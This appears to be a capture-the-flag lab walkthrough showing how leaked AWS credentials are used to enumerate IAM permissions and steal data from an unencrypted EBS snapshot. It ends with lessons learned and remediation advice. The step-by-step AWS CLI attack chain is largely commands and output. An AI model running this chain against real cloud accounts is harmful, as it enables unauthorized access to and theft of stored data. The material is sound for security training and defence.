# Walkthrough

## Step 1: Reconnaissance

Configure AWS CLI with the leaked credentials and verify identity.

```bash
# Get the leaked credentials
cd terraform
terraform output -json leaked_credentials
```

Configure a victim profile:
```bash
aws configure --profile victim
# AWS Access Key ID: <leaked-access-key>
# AWS Secret Access Key: <leaked-secret-key>
# Default region name: us-east-1
# Default output format: json
```

Verify the credentials work:
```bash
aws sts get-caller-identity --profile victim
```

Output:
```json
{
    "UserId": "AIDAYLHCQFX5XXXXXXXX",
    "Account": "123456789012",
    "Arn": "arn:aws:iam::123456789012:user/gnawlab/gnawlab-ebstheft-user-xxxxxxxx"
}
```

## Step 2: IAM Permission Enumeration

Now systematically enumerate all permissions available to this user.

### 2.1 List User Inline Policies

Check for inline policies directly attached to the user.

```bash
# Get user name from ARN
USER_NAME="gnawlab-ebstheft-user-xxxxxxxx"

aws iam list-user-policies \
  --user-name $USER_NAME \
  --profile victim
```

Output:
```json
{
    "PolicyNames": [
        "gnawlab-ebstheft-policy-xxxxxxxx"
    ]
}
```

Get the policy details:
```bash
aws iam get-user-policy \
  --user-name $USER_NAME \
  --policy-name gnawlab-ebstheft-policy-xxxxxxxx \
  --profile victim
```

Output:
```json
{
    "UserName": "gnawlab-ebstheft-user-xxxxxxxx",
    "PolicyName": "gnawlab-ebstheft-policy-xxxxxxxx",
    "PolicyDocument": {
        "Version": "2012-10-17",
        "Statement": [
            {
                "Sid": "IdentityVerification",
                "Effect": "Allow",
                "Action": ["sts:GetCallerIdentity"],
                "Resource": "*"
            },
            {
                "Sid": "IAMEnumeration",
                "Effect": "Allow",
                "Action": [
                    "iam:GetUser",
                    "iam:ListUserPolicies",
                    "iam:ListAttachedUserPolicies",
                    "iam:GetUserPolicy",
                    "iam:ListGroupsForUser",
                    "iam:ListGroupPolicies",
                    "iam:ListAttachedGroupPolicies",
                    "iam:GetGroupPolicy"
                ],
                "Resource": ["arn:aws:iam::123456789012:user/gnawlab/*", "arn:aws:iam::123456789012:group/*"]
            },
            {
                "Sid": "EC2SnapshotEnumeration",
                "Effect": "Allow",
                "Action": [
                    "ec2:DescribeSnapshots",
                    "ec2:DescribeVolumes",
                    "ec2:DescribeInstances",
                    "ec2:DescribeImages",
                    "ec2:DescribeSubnets",
                    "ec2:DescribeVpcs",
                    "ec2:DescribeSecurityGroups",
                    "ec2:DescribeKeyPairs",
                    "ec2:DescribeAvailabilityZones"
                ],
                "Resource": "*"
            },
            {
                "Sid": "EC2VolumeOperations",
                "Effect": "Allow",
                "Action": ["ec2:CreateVolume", "ec2:AttachVolume", "ec2:DetachVolume", "ec2:DeleteVolume"],
                "Resource": "*",
                "Condition": {"StringEquals": {"aws:RequestedRegion": "us-east-1"}}
            },
            {
                "Sid": "EC2InstanceOperations",
                "Effect": "Allow",
                "Action": ["ec2:RunInstances", "ec2:TerminateInstances", "ec2:StartInstances", "ec2:StopInstances"],
                "Resource": "*",
                "Condition": {"StringEquals": {"aws:RequestedRegion": "us-east-1"}}
            },
            {
                "Sid": "EC2KeyPairOperations",
                "Effect": "Allow",
                "Action": ["ec2:CreateKeyPair", "ec2:DeleteKeyPair", "ec2:ImportKeyPair"],
                "Resource": "*"
            },
            {
                "Sid": "EC2TagOperations",
                "Effect": "Allow",
                "Action": ["ec2:CreateTags"],
                "Resource": "*"
            }
        ]
    }
}
```

**Permission Analysis:**

| Statement | Permissions | Description |
|-----------|-------------|-------------|
| IdentityVerification | `sts:GetCallerIdentity` | Verify current identity |
| IAMEnumeration | `iam:GetUser`, `iam:ListUserPolicies`, etc. | Enumerate own IAM permissions |
| EC2SnapshotEnumeration | `ec2:DescribeSnapshots`, `ec2:DescribeVolumes`, etc. | Enumerate EC2/EBS resources |
| EC2VolumeOperations | `ec2:CreateVolume`, `ec2:AttachVolume`, etc. | Create and manage volumes |
| EC2InstanceOperations | `ec2:RunInstances`, `ec2:TerminateInstances`, etc. | Launch and manage instances |
| EC2KeyPairOperations | `ec2:CreateKeyPair`, `ec2:DeleteKeyPair`, etc. | Manage SSH key pairs |
| EC2TagOperations | `ec2:CreateTags` | Tag resources |

**Key findings:** The user has broad EC2/EBS permissions allowing snapshot enumeration, volume creation from any snapshot, and instance launching.

### 2.2 List Attached Managed Policies

Check for managed policies attached to the user.

```bash
aws iam list-attached-user-policies \
  --user-name $USER_NAME \
  --profile victim
```

Output:
```json
{
    "AttachedPolicies": []
}
```

No managed policies attached.

### 2.3 Check Group Membership

Check if the user belongs to any groups.

```bash
aws iam list-groups-for-user \
  --user-name $USER_NAME \
  --profile victim
```

Output:
```json
{
    "Groups": []
}
```

The user doesn't belong to any groups, so group policy enumeration is not needed.

> **Note**: If groups existed, you would use `list-group-policies`, `list-attached-group-policies`, and `get-group-policy` to enumerate group permissions as well.

## Step 3: Snapshot Discovery

Search for EBS snapshots owned by this account.

```bash
aws ec2 describe-snapshots \
  --owner-ids self \
  --profile victim
```

Output:
```json
{
    "Snapshots": [
        {
            "SnapshotId": "snap-0123456789abcdef0",
            "VolumeId": "vol-0123456789abcdef0",
            "State": "completed",
            "VolumeSize": 1,
            "Description": "Backup of decommissioned prod-db-01 server - 2024-01-15",
            "Tags": [
                {"Key": "Name", "Value": "gnawlab-ebstheft-backup-xxxxxxxx"},
                {"Key": "Server", "Value": "prod-db-01.beavertech.local"},
                {"Key": "BackupType", "Value": "full"}
            ]
        }
    ]
}
```

**Found it!** A snapshot from a decommissioned production database server.

Save the snapshot ID:
```bash
SNAPSHOT_ID="snap-0123456789abcdef0"
```

## Step 4: Create Volume from Snapshot

Create a new EBS volume from the discovered snapshot.

First, find the availability zone:
```bash
aws ec2 describe-availability-zones --profile victim --query 'AvailabilityZones[0].ZoneName' --output text
```

Output: `us-east-1a`

Create the volume:
```bash
aws ec2 create-volume \
  --snapshot-id $SNAPSHOT_ID \
  --availability-zone us-east-1a \
  --volume-type gp3 \
  --tag-specifications 'ResourceType=volume,Tags=[{Key=Name,Value=attacker-volume}]' \
  --profile victim
```

Output:
```json
{
    "VolumeId": "vol-0abcdef1234567890",
    "Size": 1,
    "SnapshotId": "snap-0123456789abcdef0",
    "AvailabilityZone": "us-east-1a",
    "State": "creating"
}
```

Save the volume ID:
```bash
VOLUME_ID="vol-0abcdef1234567890"
```

Wait for the volume to be available:
```bash
aws ec2 describe-volumes \
  --volume-ids $VOLUME_ID \
  --query 'Volumes[0].State' \
  --output text \
  --profile victim
```

## Step 5: Create SSH Key Pair

Create a key pair for SSH access to the EC2 instance.

```bash
aws ec2 create-key-pair \
  --key-name attacker-key \
  --query 'KeyMaterial' \
  --output text \
  --profile victim > ~/.ssh/attacker-key.pem

chmod 400 ~/.ssh/attacker-key.pem
```

## Step 6: Launch EC2 Instance

Find the VPC and subnet to use:
```bash
# Get the scenario's VPC
VPC_ID=$(aws ec2 describe-vpcs \
  --filters "Name=tag:Scenario,Values=ebs-snapshot-theft" \
  --query 'Vpcs[0].VpcId' \
  --output text \
  --profile victim)

# Get the subnet
SUBNET_ID=$(aws ec2 describe-subnets \
  --filters "Name=vpc-id,Values=$VPC_ID" \
  --query 'Subnets[0].SubnetId' \
  --output text \
  --profile victim)

# Get the security group
SG_ID=$(aws ec2 describe-security-groups \
  --filters "Name=vpc-id,Values=$VPC_ID" "Name=group-name,Values=*gnawlab-ebstheft*" \
  --query 'SecurityGroups[0].GroupId' \
  --output text \
  --profile victim)

echo "VPC: $VPC_ID, Subnet: $SUBNET_ID, SG: $SG_ID"
```

Find the latest Amazon Linux 2023 AMI:
```bash
AMI_ID=$(aws ec2 describe-images \
  --owners amazon \
  --filters "Name=name,Values=al2023-ami-*-x86_64" "Name=state,Values=available" \
  --query 'sort_by(Images, &CreationDate)[-1].ImageId' \
  --output text \
  --profile victim)

echo "AMI: $AMI_ID"
```

Launch the instance:
```bash
aws ec2 run-instances \
  --image-id $AMI_ID \
  --instance-type t3.micro \
  --key-name attacker-key \
  --subnet-id $SUBNET_ID \
  --security-group-ids $SG_ID \
  --associate-public-ip-address \
  --tag-specifications 'ResourceType=instance,Tags=[{Key=Name,Value=attacker-instance}]' \
  --profile victim
```

Output:
```json
{
    "Instances": [
        {
            "InstanceId": "i-0123456789abcdef0",
            "InstanceType": "t3.micro",
            "State": {"Name": "pending"}
        }
    ]
}
```

Save the instance ID:
```bash
INSTANCE_ID="i-0123456789abcdef0"
```

Wait for the instance to be running:
```bash
aws ec2 wait instance-running --instance-ids $INSTANCE_ID --profile victim
```

Get the public IP:
```bash
PUBLIC_IP=$(aws ec2 describe-instances \
  --instance-ids $INSTANCE_ID \
  --query 'Reservations[0].Instances[0].PublicIpAddress' \
  --output text \
  --profile victim)

echo "Public IP: $PUBLIC_IP"
```

## Step 7: Attach Volume to Instance

Attach the volume created from the snapshot:
```bash
aws ec2 attach-volume \
  --volume-id $VOLUME_ID \
  --instance-id $INSTANCE_ID \
  --device /dev/xvdf \
  --profile victim
```

Output:
```json
{
    "VolumeId": "vol-0abcdef1234567890",
    "InstanceId": "i-0123456789abcdef0",
    "Device": "/dev/xvdf",
    "State": "attaching"
}
```

## Step 8: SSH and Mount Volume

SSH into the instance:
```bash
ssh -i ~/.ssh/attacker-key.pem ec2-user@$PUBLIC_IP
```

Once connected, mount the volume:
```bash
# List block devices
lsblk

# Create mount point
sudo mkdir -p /mnt/stolen

# Mount the volume (it's already formatted from the original server)
sudo mount /dev/xvdf /mnt/stolen

# List contents
ls -la /mnt/stolen/
```

Output:
```
drwxr-xr-x 5 root root 4096 Jan 15  2024 .
drwxr-xr-x 3 root root 4096 May  3 12:00 ..
drwxr-xr-x 2 root root 4096 Jan 15  2024 backups
drwxr-xr-x 2 root root 4096 Jan 15  2024 config
drwxr-xr-x 2 root root 4096 Jan 15  2024 logs
```

## Step 9: Flag Extraction

Explore the backup directory:
```bash
ls -la /mnt/stolen/backups/db/
```

Output:
```
-rw-r--r-- 1 root root 512 Jan 15  2024 credentials.bak
```

Read the credentials file:
```bash
cat /mnt/stolen/backups/db/credentials.bak
```

Output:
```
# Database Credentials Backup
# Created: 2024-01-15
# Server: prod-db-01.beavertech.local
# WARNING: This file contains sensitive information

DB_HOST=prod-db.internal.beavertech.local
DB_PORT=5432
DB_NAME=beavertech_prod
DB_USER=admin
DB_PASSWORD=B3@v3rT3ch_Pr0d_2024!

# API Keys
STRIPE_API_KEY=sk_live_fake_key_for_training
AWS_INTERNAL_KEY=AKIA_FAKE_KEY_FOR_TRAINING

# Flag for GnawLab scenario
FLAG{ebs_snapshot_data_exfiltration_complete}
```

---

## Attack Chain Summary

```
1. Leaked Credentials
   ↓ Configure AWS CLI profile
2. sts:GetCallerIdentity
   ↓ Verify identity
3. iam:ListUserPolicies
   ↓ Discover policy name
4. iam:GetUserPolicy
   ↓ Analyze permissions - find EC2/EBS access
5. ec2:DescribeSnapshots
   ↓ Discover backup snapshot from decommissioned server
6. ec2:CreateVolume
   ↓ Create volume from snapshot
7. ec2:CreateKeyPair
   ↓ Create SSH key for access
8. ec2:RunInstances
   ↓ Launch attacker-controlled EC2
9. ec2:AttachVolume
   ↓ Attach stolen volume
10. SSH & Mount
    ↓ Access the data
11. FLAG{ebs_snapshot_data_exfiltration_complete}
```

---

## Key Techniques

### EBS Snapshot Data Theft

```bash
# Enumerate snapshots
aws ec2 describe-snapshots --owner-ids self

# Create volume from snapshot
aws ec2 create-volume --snapshot-id snap-xxx --availability-zone us-east-1a

# Attach to instance
aws ec2 attach-volume --volume-id vol-xxx --instance-id i-xxx --device /dev/xvdf
```

### Why This Works

| Risk Factor | Description |
|-------------|-------------|
| Snapshot Persistence | Snapshots remain after instances are terminated |
| No Encryption | Unencrypted snapshots can be mounted by anyone with access |
| Overprivileged IAM | User has broad EC2/EBS permissions |
| Data Retention | Sensitive data left in "decommissioned" backups |

---

## Lessons Learned

### 1. Snapshot Lifecycle Management
- Delete snapshots when no longer needed
- Implement retention policies
- Audit snapshot inventory regularly

### 2. Encryption at Rest
- Enable EBS encryption by default
- Use customer-managed KMS keys
- Encrypted snapshots require key access to use

### 3. Least Privilege for EC2/EBS
- Restrict `ec2:CreateVolume` to specific snapshots
- Limit `ec2:RunInstances` to approved AMIs and VPCs
- Use resource tags and conditions in IAM policies

### 4. Data Sanitization
- Scrub sensitive data before decommissioning
- Don't rely on "deleting the instance" to remove data
- Snapshots are independent copies of the data

---

## Remediation

### Secure IAM Policy Example

```json
{
  "Version": "2012-10-17",
  "Statement": [
    {
      "Effect": "Allow",
      "Action": ["ec2:CreateVolume"],
      "Resource": "*",
      "Condition": {
        "StringEquals": {
          "ec2:VolumeType": "gp3"
        },
        "NumericLessThanEquals": {
          "ec2:VolumeSize": "10"
        },
        "ForAllValues:StringEquals": {
          "aws:TagKeys": ["Environment"]
        }
      }
    }
  ]
}
```

### Enable Default EBS Encryption

```bash
aws ec2 enable-ebs-encryption-by-default --region us-east-1
```

### Additional Security Measures

1. **AWS Config Rules**: Monitor for unencrypted EBS volumes/snapshots
2. **CloudTrail**: Alert on `CreateVolume` from snapshots
3. **Service Control Policies**: Prevent sharing snapshots externally
4. **Snapshot Lock**: Use EBS Snapshot Lock for compliance
